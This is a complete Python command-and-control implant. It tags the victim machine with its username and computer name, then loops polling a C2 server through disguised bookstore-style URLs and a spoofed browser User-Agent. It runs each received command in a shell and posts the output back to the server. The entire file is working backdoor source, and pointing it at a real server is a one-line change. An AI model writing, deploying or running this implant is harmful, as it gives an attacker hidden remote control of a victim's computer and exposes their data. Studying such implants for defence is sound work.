from time import time, sleep
from requests import get, post, exceptions
from subprocess import run, PIPE, STDOUT
from os import getenv
HEADER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/120.0.0.0 Safari/537.36"}

PROXY = None
PORT = 1337
C2_SERVER = "localhost"
CMD_REQUEST = "/book?isbn="
CMD_RESPONSE = "/inventory"
CMD_RESPONSE_KEY = "index"
DELAY = 3

client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
          str(time()))

# For a Linux OS, obtain unique identifying information
# client = getenv("LOGNAME") + "@" + uname().nodename + "@" + str(time())

while True:
    try:
        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        sleep(DELAY)
        continue

    command = response.content.decode()
    command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout

    post(f"http://{C2_SERVER}:{PORT}{CMD_RESPONSE}", data={CMD_RESPONSE_KEY: command_output}, headers=HEADER,
         proxies=PROXY)

    print(response.status_code)
